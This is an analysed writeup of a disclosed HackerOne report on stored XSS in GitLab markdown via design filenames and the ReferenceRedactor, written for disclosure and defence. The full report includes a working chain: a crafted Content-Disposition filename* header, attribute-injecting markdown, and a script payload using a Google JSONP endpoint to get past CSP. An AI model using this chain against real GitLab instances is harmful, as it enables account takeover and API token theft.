# Stored XSS in Markdown via DesignReferenceFilter

## Metadata
- **Source:** HackerOne
- **Report:** 1212067 | https://hackerone.com/reports/1212067
- **Submitted:** 2021-05-28
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in GitLab's markdown rendering when processing design links. By uploading a design file with special characters in the filename (bypassing sanitization via Content-Disposition header manipulation) and referencing it in markdown, attackers can inject arbitrary HTML attributes and break out of the href attribute context. The vulnerability is further exploitable through the ReferenceRedactor which processes data-original attributes, allowing arbitrary HTML injection.

## Attack scenario
1. Attacker creates a project and issue on GitLab instance
2. Attacker uploads a design file while intercepting the request and modifying Content-Disposition header to use RFC 5987 filename* parameter with URL-encoded special characters (e.g., double quotes)
3. The filename bypass bypasses CarrierWave sanitization, allowing characters like quotes to be stored in the design filename
4. Attacker crafts a markdown reference to the design with injected HTML attributes that break out of the href attribute context
5. When the markdown is rendered, the DesignReferenceFilter creates an anchor tag with malicious attributes due to insufficient output encoding
6. If the ReferenceRedactor processes the link, it uses data-original attribute content to redact the node, allowing arbitrary HTML injection and eventual XSS execution via CSP bypass techniques (e.g., Google JSONP endpoint with setTimeout callback)

## Root cause
Multiple validation and encoding failures: (1) The link_reference_pattern regex allows any character except forward slashes and whitespace in filenames, enabling quote characters; (2) The Content-Disposition header parsing with filename* parameter bypasses CarrierWave sanitization; (3) The object_link_filter does not properly HTML-escape the url variable before inserting it into href attribute; (4) The ReferenceRedactor uses unsanitized data-original attribute content when redacting nodes

## Attacker mindset
An attacker seeks to inject persistent XSS payloads into markdown content shared across GitLab instances. The attack leverages multiple protocol weaknesses (file upload, markdown parsing, reference redaction) to bypass individual security controls. The use of CSP-compliant gadgets (Google JSONP with setTimeout) demonstrates sophisticated payload crafting to bypass Content Security Policy protections.

## Defensive takeaways
- Implement strict whitelist validation for filenames in file uploads, rejecting special characters including quotes, parentheses, and other HTML-significant characters
- Properly validate and reject RFC 5987 filename* parameters that bypass standard filename sanitization
- HTML-escape all user-controlled data before insertion into HTML attributes, particularly href attributes
- Avoid using user-controlled data directly in HTML context without context-appropriate encoding
- Sanitize and validate data-* attributes before using their values in DOM manipulation or content redaction
- Implement defense-in-depth: validate at upload, parse, and render stages
- Use templating engines with automatic context-aware escaping rather than string concatenation for HTML generation

## Variant hunting
Other reference filters that use similar patterns (user mentions, commit references, issue references) may have identical vulnerabilities
File upload endpoints in other GitLab features that accept Content-Disposition headers may bypass filename sanitization
Other attributes in the abstract_reference_filter that concatenate user input without escaping (title attribute, class attribute)
ReferenceRedactor usage in other markdown filters that process data-* attributes
Similar stored XSS chains in other GitLab markdown rendering pipelines (snippets, wiki, merge request descriptions)
CSP bypass techniques using other JSONP endpoints or similar gadgets in conjunction with markdown injection

## MITRE ATT&CK
- T1190
- T1598
- T1204
- T1566

## Notes
The vulnerability requires authenticated access to create issues and upload designs, limiting scope to logged-in users. However, the stored nature means any user viewing the affected markdown is vulnerable. The writeup demonstrates sophisticated chaining of multiple weaknesses including file upload bypass, regex manipulation, output encoding failures, and CSP gadget exploitation. The use of URL encoding in filenames (%22 for quotes) to bypass regex-based validation is noteworthy as it shows how encoding layers can evade character-class restrictions.

## Full report
<details><summary>Expand</summary>

### Summary
When rendering markdown, links to designs are parsed using the following `link_reference_pattern`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/design_management/design.rb#L168
```ruby
    def self.link_reference_pattern
      @link_reference_pattern ||= begin
        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}
        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)
        valid_char = %r{[^/\s]} # any char that is not a forward slash or whitespace
        filename_pattern = %r{
          (?<url_filename> #{valid_char}+ \. #{ext})
        }x

        super(path_segment, filename_pattern)
      end
    end
```

The `url_filename` match is then used in `parse_symbol`:
https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/design_reference_filter.rb#L75
```ruby
def parse_symbol(raw, match_data)
  filename = match_data[:url_filename]
  iid = match_data[:issue].to_i
  Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)
end
```

Since `valid_char` is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched.

The final `url` match gets used when creating the link in `object_link_filter`:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/abstract_reference_filter.rb#L219
```ruby
url =
  if matches.names.include?("url") && matches[:url]
    matches[:url]
  else
    url_for_object_cached(object, parent)
  end

content = link_content || object_link_text(object, matches)

link = %(<a href="#{url}" #{data}
            title="#{escape_once(title)}"
            class="#{klass}">#{content}</a>)
```

So if a design could be uploaded with a double quote in it's filename, this would cause it to break out of the href attribute.

Normally file uploads would go through workhorse and end up being sanitized by CarrierWave::SanitizedFile, but it's possible when uploading a design to skip the workhorse by using a `Content-Disposition` header such as `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''filename.png` which allows for any character to be used as part of the design filename.

Since whitespaces and slashes are still invalid, it's only possible to inject tags without attributes, or inject attributed into the `a` element. 

Injecting attributes can be chained with the `ReferenceRedactor` to replace the node with arbitrary html via the `data-original` attribute:

https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/reference_redactor.rb#L77
```ruby
def redacted_node_content(node)
  original_content = node.attr('data-original')
  link_reference = node.attr('data-link-reference')

  # Build the raw <a> tag just with a link as href and content if
  # it's originally a link pattern. We shouldn't return a plain text href.
  original_link =
    if link_reference == 'true'
      href = node.attr('href')
      content = original_content

      %(<a href="#{href}">#{content}</a>)
    end
```

For a CSP bypass, the jsonp endpoint of the google api can be used in combination with `setTimeout`:
`https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`

### Steps to reproduce

1. Create a new project on gitlab.com
2. Create a new issue
3. Make sure burp or similar is running
4. Upload a new design
5. Edit the request and change the Content-Disposition header to `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`
6. Refresh the page, there should now be a design named `bbb"class="gfm"a='.png`
7. Create a new issue using the design link and the inner html containing a quote:
```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' vakzz=here
</a>
```
8. Looking at the markup you can see the `a` attribute contains everything up to the inner html and then the attribute `vakzz` has also been injected:
```html
<a href="https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb" class="gfm" a=".png&quot; data-original=&quot;
' vakzz=here
&quot; data-link=&quot;true&quot; data-link-reference=&quot;true&quot; data-project=&quot;26924211&quot; data-design=&quot;226146&quot; data-issue=&quot;87875440&quot; data-reference-type=&quot;design&quot; data-container=&quot;body&quot; data-placement=&quot;top&quot;
                          title=&quot;bbb&quot;class=&quot;gfm&quot;a='.png&quot;
                          class=&quot;gfm gfm-design has-tooltip&quot;>
" vakzz="here"></a>
```
7. Create a new issue using the design link, this time including the required data attributed to trigger the `ReferenceRedactor` and the payload html encoded in the `data-original`:

```
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' data-design="1" data-issue="1" data-reference-type="design" data-original="
  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>
"
</a>
```
8. Save the issue and reload the page

{F1318763}

### Impact
Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

### Examples
POC:
https://gitlab.com/vakzz-h1/design-xss/-/issues/3

### What is the current *bug* behavior?
* The `AbstractReferenceFilter` is generating the `link` using string interpolation but the `url` could contain double quotes
* The design model  can have an arbitrary` attribute

### What is the expected *correct* behavior?
* The url should be validated or escaped before being used
* The design model could probably have a validator for the filename

### Relevant logs and/or screenshots

### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.

</details>

---
*Analysed by Claude on 2026-05-11*
